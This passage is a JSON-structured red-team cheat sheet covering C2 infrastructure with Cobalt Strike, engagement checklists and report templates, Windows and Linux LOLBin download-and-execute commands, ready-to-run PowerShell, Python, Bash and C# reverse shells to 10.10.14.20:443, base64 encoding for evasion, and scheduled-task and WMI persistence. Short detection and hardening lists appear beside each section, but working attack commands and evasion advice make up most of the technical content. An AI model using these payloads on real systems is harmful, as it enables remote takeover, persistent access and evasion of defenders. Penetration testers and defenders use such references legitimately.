                    "-based detection rules"
                  ]
                },
                {
                  "parts": [
                    "Technique-specific hardening"
                  ]
                },
                {
                  "parts": [
                    "Control implementation"
                  ]
                },
                {
                  "parts": [
                    "Security maturity assessment"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**MITRE ATT&CK Framework**",
                ", ",
                "**Navigator**",
                ", detection engineering guides"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Understand technique detection likelihood. Map to client security controls."
              ]
            },
            {
              "type": "h3",
              "text": "12.5 C2 Infrastructure Setup"
            },
            {
              "type": "h4",
              "text": "Professional C2 infrastructure:"
            },
            {
              "type": "p",
              "parts": [
                "**Redirector Setup:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# socat redirector\nsocat TCP-LISTEN:80,fork TCP:teamserver:80\n\n# Apache mod_rewrite\nRewriteEngine On\nRewriteCond %{HTTP_HOST} ^redirector.com$\nRewriteRule ^/(.*)$ http://teamserver:80/$1 [P]\n\n# DNS redirector\n# Point domains to teamserver IP"
            },
            {
              "type": "p",
              "parts": [
                "**Domain Setup:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Domain registration\n# Use common TLDs (.com, .net)\n# Set short TTL for quick changes\n# Configure DNS records\n\n# SSL certificates\nletsencrypt certonly --webroot -w /var/www/html -d redirector.com"
            },
            {
              "type": "p",
              "parts": [
                "**Teamserver Configuration:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Cobalt Strike teamserver\n./teamserver 10.10.14.20 password /path/to/profile.profile\n\n# Malleable C2 profile\nhttp-get {\n    set uri \"/api/collect\";\n    client {\n        metadata {\n            base64;\n            header \"Cookie\";\n        }\n    }\n}"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Resilient, scalable C2 infrastructure with redundancy and operational security."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Infrastructure fingerprinting"
                  ]
                },
                {
                  "parts": [
                    "Certificate analysis"
                  ]
                },
                {
                  "parts": [
                    "Traffic pattern recognition"
                  ]
                },
                {
                  "parts": [
                    "Domain reputation monitoring"
                  ]
                },
                {
                  "parts": [
                    "Take-down coordination"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Cobalt Strike**",
                ", ",
                "**Metasploit**",
                ", ",
                "**Apache**",
                ", ",
                "**socat**",
                ", ",
                "**Let's Encrypt**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Regular infrastructure rotation. Monitoring for compromise. Geographic distribution."
              ]
            },
            {
              "type": "h2",
              "text": "13. 🎯 Bonus"
            },
            {
              "type": "h3",
              "text": "13.1 Realistic Scenarios"
            },
            {
              "type": "h4",
              "text": "Common engagement scenarios:"
            },
            {
              "type": "p",
              "parts": [
                "**External Network Assessment:**"
              ]
            },
            {
              "type": "code",
              "language": "markdown",
              "text": "1. Reconnaissance → Subdomain enumeration, port scanning\n2. Vulnerability identification → Web apps, services\n3. Exploitation → Public exploits, custom payloads\n4. Post-exploitation → Privilege escalation, lateral movement\n5. Data access → Sensitive data identification\n6. Reporting → Findings, recommendations"
            },
            {
              "type": "p",
              "parts": [
                "**Internal Network Assessment:**"
              ]
            },
            {
              "type": "code",
              "language": "markdown",
              "text": "1. Initial access → Phishing, physical access\n2. Local enumeration → Users, groups, network\n3. Privilege escalation → Misconfigurations, vulnerabilities\n4. Domain compromise → Credential dumping, lateral movement\n5. Persistence → Multiple mechanisms\n6. Objectives → Data access, control demonstration"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Real-world attack simulation following common adversary tactics."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Defense-in-depth"
                  ]
                },
                {
                  "parts": [
                    "Incident response testing"
                  ]
                },
                {
                  "parts": [
                    "Control validation"
                  ]
                },
                {
                  "parts": [
                    "Security awareness"
                  ]
                },
                {
                  "parts": [
                    "Continuous monitoring"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "Engagement playbooks, scenario libraries, ",
                "**TTP**",
                " databases"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Follow engagement rules. Document actions. Maintain professionalism."
              ]
            },
            {
              "type": "h3",
              "text": "13.2 Checklists"
            },
            {
              "type": "h4",
              "text": "Engagement preparation and execution:"
            },
            {
              "type": "p",
              "parts": [
                "**Pre-engagement Checklist:**"
              ]
            },
            {
              "type": "code",
              "language": "markdown",
              "text": "- [x] Scope definition and authorization\n- [x] Rules of engagement documented\n- [x] Communication channels established\n- [x] Infrastructure setup and testing\n- [x] Tools prepared and tested\n- [x] Client contacts identified\n- [x] Emergency procedures documented"
            },
            {
              "type": "p",
              "parts": [
                "**Post-engagement Checklist:**"
              ]
            },
            {
              "type": "code",
              "language": "markdown",
              "text": "- [x] All persistence removed\n- [x] Client systems returned to normal\n- [x] Data securely handled/returned\n- [x] Findings documented and verified\n- [x] Report drafted and reviewed\n- [x] Client debrief scheduled\n- [x] Lessons learned documented"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Organized engagement execution and professional client delivery."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Process documentation"
                  ]
                },
                {
                  "parts": [
                    "Quality assurance"
                  ]
                },
                {
                  "parts": [
                    "Client satisfaction"
                  ]
                },
                {
                  "parts": [
                    "Continuous improvement"
                  ]
                },
                {
                  "parts": [
                    "Knowledge management"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "Engagement templates, project management tools, documentation systems"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Maintain checklists securely. Update regularly. Share lessons learned."
              ]
            },
            {
              "type": "h3",
              "text": "13.3 Reporting Templates"
            },
            {
              "type": "h4",
              "text": "Professional reporting structure:"
            },
            {
              "type": "p",
              "parts": [
                "**Executive Summary:**"
              ]
            },
            {
              "type": "code",
              "language": "markdown",
              "text": "# Executive Summary\n\n## Overall Risk Rating: High/Medium/Low\n\n## Key Findings\n- Critical vulnerability in web application\n- Domain admin compromise possible\n- Sensitive data exposed\n\n## Business Impact\n- Potential financial loss: $X\n- Compliance violations: Yes/No\n- Reputation damage: High/Medium/Low\n\n## Immediate Actions\n1. Patch critical vulnerability\n2. Reset compromised credentials\n3. Implement monitoring controls"
            },
            {
              "type": "p",
              "parts": [
                "**Technical Details:**"
              ]
            },
            {
              "type": "code",
              "language": "markdown",
              "text": "# Technical Findings\n\n## Vulnerability Details\n- CVE-XXXX-XXXX: Remote Code Execution\n- CVSS Score: 9.8\n- Attack Path: External → Web Server → Domain Admin\n\n## Evidence\n- Screenshots of compromised systems\n- Log excerpts showing attack progression\n- Data accessed during testing\n\n## Recommendations\n- Technical controls\n- Process improvements\n- Training recommendations"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Professional, actionable reports that help clients improve security posture."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Clear communication"
                  ]
                },
                {
                  "parts": [
                    "Actionable recommendations"
                  ]
                },
                {
                  "parts": [
                    "Risk-based prioritization"
                  ]
                },
                {
                  "parts": [
                    "Business context"
                  ]
                },
                {
                  "parts": [
                    "Follow-up planning"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "Reporting templates, risk frameworks, presentation tools"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Secure report storage. Client-specific sensitivity. Professional delivery."
              ]
            }
          ]
        },
        {
          "id": "2",
          "title": "2",
          "content": [
            {
              "type": "h2",
              "text": "2.1 <span class=\"hl-blue\">LOLBins</span> (<span class=\"hl-blue\">Living Off the Land Binaries</span>)",
              "parts": [
                "2.1 ",
                {
                  "text": "LOLBins",
                  "color": "blue"
                },
                " (",
                {
                  "text": "Living Off the Land Binaries",
                  "color": "blue"
                },
                ")"
              ]
            },
            {
              "type": "h3",
              "text": "What it is / Why it matters",
              "parts": [
                "What it is / Why it matters"
              ]
            },
            {
              "type": "p",
              "parts": [
                {
                  "text": "Living Off the Land Binaries",
                  "color": "yellow"
                },
                " (",
                {
                  "text": "LOLBins",
                  "color": "blue"
                },
                ") involve using ",
                {
                  "text": "legitimate system binaries and scripts",
                  "color": "yellow"
                },
                " to perform ",
                {
                  "text": "malicious actions",
                  "color": "red"
                },
                ". This approach makes ",
                {
                  "text": "detection harder",
                  "color": "red"
                },
                " as these are ",
                {
                  "text": "trusted applications",
                  "color": "yellow"
                },
                " that are typically whitelisted or less scrutinized."
              ]
            },
            {
              "type": "h3",
              "text": "Quick steps / Commands",
              "parts": [
                "Quick steps / Commands"
              ]
            },
            {
              "type": "h4",
              "text": "Windows LOLBins for Download",
              "parts": [
                "Windows LOLBins for Download"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Using certutil to download a file\ncertutil -urlcache -split -f http://10.10.14.20/malware.exe malware.exe\n\n# Using bitsadmin for background download\nbitsadmin /transfer job /download /priority normal http://10.10.14.20/malware.exe C:\\Windows\\Temp\\malware.exe\n\n# Using regsvr32 for scriptlet execution (e.g., download & execute)\nregsvr32 /s /n /u /i:http://10.10.14.20/file.sct scrobj.dll\n\n# Using msiexec to install an MSI package\nmsiexec /q /i http://10.10.14.20/package.msi"
            },
            {
              "type": "h4",
              "text": "Windows LOLBins for Execution",
              "parts": [
                "Windows LOLBins for Execution"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# MSBuild for C# execution (compiles and executes embedded C#)\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe malware.xml\n\n# InstallUtil for executing signed code (e.g., from a .NET assembly)\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U malware.dll\n\n# Rundll32 to execute a specific function in a DLL\nrundll32.exe malware.dll,EntryPoint\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"w=new ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");"
            },
            {
              "type": "h4",
              "text": "Linux LOLBins",
              "parts": [
                "Linux LOLBins"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Download and execute a script directly\ncurl http://10.10.14.20/shell.sh | bash\nwget -q -O- http://10.10.14.20/shell.sh | bash\n\n# Privilege Escalation (examples)\nsudo -l  # Check sudo permissions for the current user\nfind / -perm -u=s -type f 2>/dev/null  # Find SUID binaries"
            },
            {
              "type": "h3",
              "text": "What to expect",
              "parts": [
                "What to expect"
              ]
            },
            {
              "type": "p",
              "parts": [
                "These commands ",
                {
                  "text": "blend with normal administrative activity",
                  "color": "yellow"
                },
                ", making ",
                {
                  "text": "detection difficult",
                  "color": "red"
                },
                ". Execution may be ",
                {
                  "text": "blocked by application control policies",
                  "color": "red"
                },
                " or next-gen antivirus."
              ]
            },
            {
              "type": "h3",
              "text": "Detection / Hardening",
              "parts": [
                "Detection / Hardening"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Application whitelisting",
                      "color": "green"
                    },
                    " (",
                    {
                      "text": "AppLocker",
                      "color": "blue"
                    },
                    ", ",
                    {
                      "text": "WDAC",
                      "color": "blue"
                    },
                    ") to prevent unauthorized binaries from running."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Monitor for unusual process chains",
                      "color": "yellow"
                    },
                    " (e.g., ",
                    {
                      "type": "inline_code",
                      "text": "certutil"
                    },
                    " spawning ",
                    {
                      "type": "inline_code",
                      "text": "powershell"
                    },
                    ", ",
                    {
                      "type": "inline_code",
                      "text": "wscript"
                    },
                    " spawning ",
                    {
                      "type": "inline_code",
                      "text": "cmd.exe"
                    },
                    ")."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Network monitoring for downloads by system binaries",
                      "color": "yellow"
                    },
                    " from untrusted sources."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "EDR behavioral detection",
                      "color": "green"
                    },
                    " for ",
                    {
                      "text": "living-off-the-land patterns",
                      "color": "yellow"
                    },
                    "."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Tools / References",
              "parts": [
                "Tools / References"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "LOLBAS project",
                      "color": "fuchsia"
                    },
                    ": ",
                    {
                      "text": "Living Off The Land Binaries and Scripts",
                      "color": "yellow"
                    },
                    " (lolbas-project.github.io)"
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "GTFO bins",
                      "color": "fuchsia"
                    },
                    ": ",
                    {
                      "text": "GTFO (Grep The F**k Out) Bins",
                      "color": "yellow"
                    },
                    " (gtfobins.github.io)"
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Living Off The Land Attack Detection",
                      "color": "fuchsia"
                    },
                    " (various blogs and research papers)"
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "OPSEC / Notes",
              "parts": [
                "OPSEC / Notes"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Use ",
                    {
                      "text": "least suspicious binaries first",
                      "color": "yellow"
                    },
                    "."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Chain multiple LOLBins",
                      "color": "yellow"
                    },
                    " to ",
                    {
                      "text": "obscure the final payload",
                      "color": "yellow"
                    },
                    "."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Mimic legitimate administrative commands",
                      "color": "yellow"
                    },
                    " to blend in."
                  ]
                }
              ]
            },
            {
              "type": "hr"
            },
            {
              "type": "h2",
              "text": "2.2 <span class=\"hl-blue\">PowerShell</span> / <span class=\"hl-blue\">C#</span> / <span class=\"hl-blue\">Python</span> / <span class=\"hl-blue\">Bash Payloads</span>",
              "parts": [
                "2.2 ",
                {
                  "text": "PowerShell",
                  "color": "blue"
                },
                " / ",
                {
                  "text": "C#",
                  "color": "blue"
                },
                " / ",
                {
                  "text": "Python",
                  "color": "blue"
                },
                " / ",
                {
                  "text": "Bash Payloads",
                  "color": "blue"
                }
              ]
            },
            {
              "type": "h3",
              "text": "What it is / Why it matters",
              "parts": [
                "What it is / Why it matters"
              ]
            },
            {
              "type": "p",
              "parts": [
                "These are ",
                {
                  "text": "cross-platform payloads",
                  "color": "blue"
                },
                " and ",
                {
                  "text": "reverse shells",
                  "color": "blue"
                },
                " designed for different target environments. They are ",
                {
                  "text": "essential for flexibility in engagements",
                  "color": "green"
                },
                ", allowing operators to adapt to various operating systems and security controls."
              ]
            },
            {
              "type": "h3",
              "text": "Quick steps / Commands",
              "parts": [
                "Quick steps / Commands"
              ]
            },
            {
              "type": "h4",
              "text": "PowerShell Reverse Shells",
              "parts": [
                "PowerShell Reverse Shells"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# One-liner PowerShell reverse shell (connects to 10.10.14.20:443)\n$client = New-Object System.Net.Sockets.TCPClient('10.10.14.20',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\n# Base64 encoded version (for -enc parameter)\n# Encode the command:\n$command = '$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.20'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encoded = [Convert]::ToBase64String($bytes)\n# Then execute: powershell -enc $encoded"
            },
            {
              "type": "h4",
              "text": "Python Reverse Shells",
              "parts": [
                "Python Reverse Shells"
              ]
            },
            {
              "type": "code",
              "language": "python",
              "text": "# Python 2.x one-liner reverse shell\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n# Python 3.x with better error handling and pty for interactive shell\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
            },
            {
              "type": "h4",
              "text": "Bash Reverse Shells",
              "parts": [
                "Bash Reverse Shells"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Standard bash reverse shell\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1\n\n# Alternative bash reverse shell\n/bin/bash -l > /dev/tcp/10.10.14.20/443 0<&1 2>&1\n\n# Using socat for a more stable reverse shell (requires socat to be present)\nsocat TCP:10.10.14.20:443 EXEC:/bin/bash"
            },
            {
              "type": "h4",
              "text": "C# Reverse Shell (compile first)",
              "parts": [
                "C# Reverse Shell (compile first)"
              ]
            },
            {
              "type": "p",
              "parts": [
                "Compile this code into an executable (e.g., using ",
                {
                  "type": "inline_code",
                  "text": "csc.exe"
                },
                " on Windows or ",
                {
                  "type": "inline_code",
                  "text": "dotnet build"
                },
                " on Linux/macOS)."
              ]
            },
            {
              "type": "code",
              "language": "csharp",
              "text": "using System;\nusing System.Net.Sockets;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Text; // Added for StringBuilder\n\nclass Program {\n    static StreamWriter streamWriter;\n    \n    public static void Main(string[] args) {\n        using(TcpClient client = new TcpClient(\"10.10.14.20\", 443)) {\n            using(Stream stream = client.GetStream()) {\n                using(StreamReader rdr = new StreamReader(stream)) {\n                    streamWriter = new StreamWriter(stream);\n                    \n                    StringBuilder strInput = new StringBuilder();\n                    Process p = new Process();\n                    p.StartInfo.FileName = \"cmd.exe\"; // Or \"/bin/bash\" for Linux\n                    p.StartInfo.CreateNoWindow = true;\n                    p.StartInfo.UseShellExecute = false;\n                    p.StartInfo.RedirectStandardOutput = true;\n                    p.StartInfo.RedirectStandardInput = true;\n                    p.StartInfo.RedirectStandardError = true;\n                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n                    p.Start();\n                    p.BeginOutputReadLine();\n                    \n                    while(true) {\n                        strInput.Append(rdr.ReadLine());\n                        p.StandardInput.WriteLine(strInput);\n                        strInput.Remove(0, strInput.Length);\n                    }\n                }\n            }\n        }\n    }\n    \n    public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {\n        StringBuilder strOutput = new StringBuilder();\n        if (!String.IsNullOrEmpty(outLine.Data)) {\n            try {\n                strOutput.Append(outLine.Data);\n                streamWriter.WriteLine(strOutput);\n                streamWriter.Flush();\n            } catch (Exception err) { /* Handle potential errors, e.g., stream closed */ }\n        }\n    }\n}"
            },
            {
              "type": "h3",
              "text": "What to expect",
              "parts": [
                "What to expect"
              ]
            },
            {
              "type": "p",
              "parts": [
                {
                  "text": "Immediate shell access",
                  "color": "green"
                },
                " if ",
                {
                  "text": "network connectivity exists",
                  "color": "red"
                },
                " and the ",
                {
                  "text": "payload executes successfully",
                  "color": "red"
                },
                ". This may be ",
                {
                  "text": "blocked by application control",
                  "color": "red"
                },
                " or ",
                {
                  "text": "EDR",
                  "color": "red"
                },
                " solutions."
              ]
            },
            {
              "type": "h3",
              "text": "Detection / Hardening",
              "parts": [
                "Detection / Hardening"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Network monitoring for reverse shells",
                      "color": "yellow"
                    },
                    " (outbound connections to unusual ports/IPs from system processes)."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Process monitoring for suspicious child processes",
                      "color": "yellow"
                    },
                    " (e.g., ",
                    {
                      "type": "inline_code",
                      "text": "cmd.exe"
                    },
                    " or ",
                    {
                      "type": "inline_code",
                      "text": "powershell.exe"
                    },
                    " spawning from unexpected parents like ",
                    {
                      "type": "inline_code",
                      "text": "python.exe"
                    },
                    " or ",
                    {
                      "type": "inline_code",
                      "text": "svchost.exe"
                    },
                    ")."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Application control policies",
                      "color": "green"
                    },
                    " to restrict execution of scripting engines or binaries."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "PowerShell Constrained Language Mode",
                      "color": "green"
                    },
                    " to limit cmdlets and .NET types that can be used."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Script block logging for PowerShell",
                      "color": "green"
                    },
                    " to capture executed script content."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Tools / References",
              "parts": [
                "Tools / References"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "MSFVenom",
                      "color": "blue"
                    },
                    ": Payload generation framework."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "PowerSploit",
                      "color": "blue"
                    },
                    ": A collection of PowerShell modules for offensive security."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Nishang",
                      "color": "blue"
                    },
                    ": A framework of PowerShell scripts for offensive security."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "RevShells.com",
                      "color": "blue"
                    },
                    ": Online resource for various reverse shell one-liners."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "OPSEC / Notes",
              "parts": [
                "OPSEC / Notes"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Use ",
                    {
                      "text": "encoded/obfuscated versions",
                      "color": "yellow"
                    },
                    " to evade signature-based detection."
                  ]
                },
                {
                  "parts": [
                    "Consider ",
                    {
                      "text": "staging",
                      "color": "yellow"
                    },
                    " payloads to avoid large one-liners."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Test payloads against target EDR",
                      "color": "yellow"
                    },
                    " solutions before engagement."
                  ]
                }
              ]
            },
            {
              "type": "hr"
            },
            {
              "type": "h2",
              "text": "2.3 <span class=\"hl-blue\">Scheduled Tasks</span> / <span class=\"hl-blue\">WMI</span>",
              "parts": [
                "2.3 ",
                {
                  "text": "Scheduled Tasks",
                  "color": "blue"
                },
                " / ",
                {
                  "text": "WMI",
                  "color": "blue"
                }
              ]
            },
            {
              "type": "h3",
              "text": "What it is / Why it matters",
              "parts": [
                "What it is / Why it matters"
              ]
            },
            {
              "type": "p",
              "parts": [
                {
                  "text": "Scheduled Tasks",
                  "color": "yellow"
                },
                " and ",
                {
                  "text": "WMI",
                  "color": "blue"
                },
                " (Windows Management Instrumentation) are ",
                {
                  "text": "legitimate Windows administration tools",
                  "color": "yellow"
                },
                " that can be ",
                {
                  "text": "abused for code execution and persistence",
                  "color": "red"
                },
                ". They are ",
                {
                  "text": "very common in enterprise environments",
                  "color": "yellow"
                },
                ", making their malicious use difficult to distinguish from benign activity."
              ]
            },
            {
              "type": "h3",
              "text": "Quick steps / Commands",
              "parts": [
                "Quick steps / Commands"
              ]
            },
            {
              "type": "h4",
              "text": "Scheduled Tasks for Execution",
              "parts": [
                "Scheduled Tasks for Execution"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Create a one-time scheduled task via command line (executes malware.exe as SYSTEM)\nschtasks /create /tn \"SystemUpdate\" /tr \"C:\\Windows\\System32\\malware.exe\" /sc once /st 00:00 /ru SYSTEM\nschtasks /run /tn \"SystemUpdate\"\n\n# Create a daily scheduled task with specific user context\nschtasks /create /tn \"OfficeUpdate\" /tr \"C:\\malware.exe\" /sc daily /st 09:00 /u DOMAIN\\User /p Password123\n\n# Create a temporary task that deletes itself after execution\nschtasks /create /tn \"TempTask\" /tr \"cmd.exe /c C:\\malware.exe && schtasks /delete /tn TempTask /f\" /sc once /st 00:01"
            },
            {
              "type": "h4",
              "text": "PowerShell Scheduled Tasks",
              "parts": [
                "PowerShell Scheduled Tasks"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Create a scheduled task that runs a PowerShell script at user logon as SYSTEM\n$Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -File C:\\malware.ps1\"\n$Trigger = New-ScheduledTaskTrigger -AtLogOn -User \"SYSTEM\"\nRegister-ScheduledTask -TaskName \"WindowsUpdate\" -Action $Action -Trigger $Trigger -RunLevel Highest\n\n# Immediately start an existing scheduled task\nStart-ScheduledTask -TaskName \"WindowsUpdate\""
            },
            {
              "type": "h4",
              "text": "WMI for Execution",
              "parts": [
                "WMI for Execution"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Local WMI execution (creates a process via WMI)\nwmic process call create \"cmd.exe /c whoami > C:\\output.txt\"\n\n# Remote WMI execution (connects to 192.168.1.10 and creates a process)\nwmic /node:192.168.1.10 /user:DOMAIN\\User /password:Password123 process call create \"malware.exe\""
            },
            {
              "type": "h4",
              "text": "WMI Permanent Event Subscription (for Persistence)",
              "parts": [
                "WMI Permanent Event Subscription (for Persistence)"
              ]
            },
            {
              "type": "p",
              "parts": [
                "This is a more complex setup that uses WMI event consumers and filters for persistence."
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Define the WMI Event Filter (triggers when notepad.exe is created)\n$FilterArgs = @{\n    Name = 'WindowsUpdateFilter'\n    EventNameSpace = 'root\\cimv2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'\"\n}\n$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs\n\n# Define the WMI Event Consumer (executes cmd.exe /c C:\\malware.exe)\n$ConsumerArgs = @{\n    Name = 'WindowsUpdateConsumer'\n    CommandLineTemplate = \"cmd.exe /c C:\\malware.exe\"\n}\n$Consumer = Set-WmiInstance -Namespace root/subscription -Class __CommandLineEventConsumer -Arguments $ConsumerArgs\n\n# Bind the Filter to the Consumer\nSet-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}"
            },
            {
              "type": "h3",
              "text": "What to expect",
              "parts": [
                "What to expect"
              ]
            },
            {
              "type": "p",
              "parts": [
                {
                  "text": "Reliable code execution",
                  "color": "green"
                },
                " that ",
                {
                  "text": "blends with normal system administration",
                  "color": "yellow"
                },
                ". ",
                {
                  "text": "WMI works well for remote execution in domain environments",
                  "color": "yellow"
                },
                ", often bypassing common firewall rules."
              ]
            },
            {
              "type": "h3",
              "text": "Detection / Hardening",
              "parts": [
                "Detection / Hardening"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Monitor for suspicious scheduled task names, timings, or unusual actions",
                      "color": "yellow"
                    },
                    "."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "WMI event subscription auditing",
                      "color": "yellow"
                    },
                    " for new or modified event filters/consumers."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Process creation monitoring",
                      "color": "yellow"
                    },
                    " for executables spawned by ",
                    {
                      "type": "inline_code",
                      "text": "svchost.exe"
                    },
                    " (scheduled tasks) or ",
                    {
                      "type": "inline_code",
                      "text": "WmiPrvSE.exe"
                    },
                    " (WMI provider host)."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Sysmon Event ID 19",
                      "color": "blue"
                    },
                    " (",
                    {
                      "text": "WmiEventFilter",
                      "color": "yellow"
                    },
                    "), ",
                    {
                      "text": "20",
                      "color": "blue"
                    },
                    " (",
                    {
                      "text": "WmiEventConsumer",
                      "color": "yellow"
                    },
                    "), ",
                    {
                      "text": "21",
                      "color": "blue"
                    },
                    " (",
                    {
                      "text": "WmiEventConsumerToFilter",
                      "color": "yellow"
                    },
                    ") are crucial for WMI persistence detection."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Tools / References",
              "parts": [
                "Tools / References"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "schtasks.exe",
                      "color": "blue"
                    },
                    ": Native Windows command-line tool for scheduled tasks."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "wmic.exe",
                      "color": "blue"
                    },
                    ": Native Windows command-line tool for WMI."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "PowerShell ScheduledTask module",
                      "color": "blue"
                    },
